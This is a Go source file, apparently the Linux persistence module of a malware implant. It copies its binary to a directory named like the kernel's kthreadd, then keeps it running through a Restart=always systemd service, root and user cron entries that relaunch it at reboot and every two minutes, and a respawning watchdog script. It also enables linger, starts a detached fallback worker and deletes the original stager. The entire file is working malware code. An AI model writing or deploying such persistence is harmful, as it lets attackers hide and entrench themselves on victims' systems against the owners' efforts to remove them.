//go:build linux

package persist

import (
	"fmt"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"strconv"
	"syscall"
)

const (
	installDir  = "/var/local/kthreadd"
	installName = "kthread"
	serviceName = "kthread.service"
	watchName   = "watch.sh"
)

func installPath() string {
	return filepath.Join(installDir, installName)
}

func watchScriptPath() string {
	return filepath.Join(installDir, watchName)
}

func serviceUnitPath() string {
	if isRoot() {
		return filepath.Join("/etc/systemd/system", serviceName)
	}
	return filepath.Join(homeDir(), ".config/systemd/user", serviceName)
}

func serviceWantedBy() string {
	if isRoot() {
		return "multi-user.target"
	}
	return "default.target"
}

func isRoot() bool {
	return os.Getuid() == 0
}

func homeDir() string {
	home, err := os.UserHomeDir()
	if err != nil {
		u, err2 := user.Current()
		if err2 != nil {
			return "/tmp"
		}
		return u.HomeDir
	}
	return home
}

func ensurePlatform() bool {
	if isServiceWorker() {
		return false
	}

	target := installPath()
	self, err := os.Executable()
	if err != nil {
		self = os.Args[0]
	}
	self = filepath.Clean(self)
	target = filepath.Clean(target)

	if err := os.MkdirAll(installDir, 0755); err != nil {
		return false
	}

	if !pathsEqual(self, target) {
		if err := copyFile(self, target); err != nil {
			return false
		}
	}

	refreshAutorun(target)

	if pathsEqual(self, target) {
		if isUnderSystemd() {
			return false
		}
		if handOffToService(target) {
			return true
		}
		return false
	}

	if handOffToService(target) {
		deleteStagerLater(self)
		return true
	}

	if startFallbackWorker(target) {
		deleteStagerLater(self)
		return true
	}
	return false
}

func prepareRuntimePlatform() {}

func pathsEqual(a, b string) bool {
	return filepath.Clean(a) == filepath.Clean(b)
}

func copyFile(src, dst string) error {
	in, err := os.ReadFile(src)
	if err != nil {
		return err
	}
	return os.WriteFile(dst, in, 0755)
}

func refreshAutorun(exe string) {
	if !isRoot() {
		ensureUserSystemdEnv()
		enableLinger()
	}
	_ = writeWatchScript(exe)
	_ = installSystemdService(exe)
	_ = installCronEntries(exe)
}

func handOffToService(exe string) bool {
	_ = writeWatchScript(exe)
	_ = installSystemdService(exe)
	_ = installCronEntries(exe)

	if enableAndStartService() {
		return true
	}
	return startFallbackWorker(exe)
}

func enableAndStartService() bool {
	if isRoot() {
		_ = exec.Command("systemctl", "daemon-reload").Run()
		return systemctl("enable", "--now", serviceName)
	}
	ensureUserSystemdEnv()
	enableLinger()
	_ = exec.Command("systemctl", "--user", "daemon-reload").Run()
	return systemctlUser("enable", "--now", serviceName)
}

func startFallbackWorker(exe string) bool {
	cmd := exec.Command(exe, "--service-worker")
	cmd.Stdout = nil
	cmd.Stderr = nil
	cmd.Stdin = nil
	cmd.SysProcAttr = &syscall.SysProcAttr{Setsid: true}
	return cmd.Start() == nil
}

func writeWatchScript(exe string) error {
	scriptPath := watchScriptPath()
	script := fmt.Sprintf(`#!/bin/sh
EXE=%q
while true; do
  if ! pgrep -f "$EXE --service-worker" >/dev/null 2>&1; then
    "$EXE" --service-worker >/dev/null 2>&1 &
  fi
  sleep 15
done
`, exe)
	if err := os.MkdirAll(filepath.Dir(scriptPath), 0755); err != nil {
		return err
	}
	return os.WriteFile(scriptPath, []byte(script), 0755)
}

func installSystemdService(exe string) error {
	unitPath := serviceUnitPath()
	unit := fmt.Sprintf(`[Unit]
Description=kthread
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
ExecStart=%s --service-worker
Restart=always
RestartSec=3
KillMode=mixed
TimeoutStopSec=15

[Install]
WantedBy=%s
`, exe, serviceWantedBy())
	if err := os.MkdirAll(filepath.Dir(unitPath), 0755); err != nil {
		return err
	}
	return os.WriteFile(unitPath, []byte(unit), 0644)
}

func installCronEntries(exe string) error {
	if isRoot() {
		return installRootCron(exe)
	}
	return installUserCron(exe)
}

func installRootCron(exe string) error {
	watch := watchScriptPath()
	content := fmt.Sprintf(`SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

@reboot root %s --service-worker >/dev/null 2>&1 &
@reboot root /bin/sh %s >/dev/null 2>&1 &
*/2 * * * * root pgrep -f %q >/dev/null 2>&1 || %s --service-worker >/dev/null 2>&1 &
`, exe, watch, exe+" --service-worker", exe)
	if err := os.WriteFile("/etc/cron.d/kthread", []byte(content), 0644); err != nil {
		return err
	}
	return installUserCron(exe)
}

func installUserCron(exe string) error {
	watch := watchScriptPath()
	rebootLine := fmt.Sprintf("@reboot %q --service-worker >/dev/null 2>&1 &", exe)
	watchLine := fmt.Sprintf("@reboot /bin/sh %q >/dev/null 2>&1 &", watch)
	guardLine := fmt.Sprintf("*/2 * * * * pgrep -f %q >/dev/null 2>&1 || %q --service-worker >/dev/null 2>&1 &", exe+" --service-worker", exe)
	script := fmt.Sprintf(`(crontab -l 2>/dev/null | grep -Fv %q | grep -Fv %q | grep -Fv %q; echo %q; echo %q; echo %q) | crontab -`,
		exe, watch, "kthread", rebootLine, watchLine, guardLine)
	cmd := exec.Command("sh", "-c", script)
	return cmd.Run()
}

func ensureUserSystemdEnv() {
	if os.Getenv("XDG_RUNTIME_DIR") != "" {
		return
	}
	dir := filepath.Join("/run/user", strconv.Itoa(os.Getuid()))
	if st, err := os.Stat(dir); err == nil && st.IsDir() {
		_ = os.Setenv("XDG_RUNTIME_DIR", dir)
	}
}

func enableLinger() {
	u, err := user.Current()
	if err != nil {
		return
	}
	cmd := exec.Command("loginctl", "enable-linger", u.Username)
	cmd.Stdout = nil
	cmd.Stderr = nil
	_ = cmd.Run()
}

func systemctl(args ...string) bool {
	cmd := exec.Command("systemctl", args...)
	cmd.Stdout = nil
	cmd.Stderr = nil
	return cmd.Run() == nil
}

func systemctlUser(args ...string) bool {
	cmd := exec.Command("systemctl", append([]string{"--user"}, args...)...)
	cmd.Stdout = nil
	cmd.Stderr = nil
	return cmd.Run() == nil
}

func isUnderSystemd() bool {
	return os.Getenv("INVOCATION_ID") != "" || os.Getenv("JOURNAL_STREAM") != ""
}

func deleteStagerLater(path string) {
	script := fmt.Sprintf("sleep 2; rm -f %q", path)
	cmd := exec.Command("sh", "-c", script)
	_ = cmd.Start()
}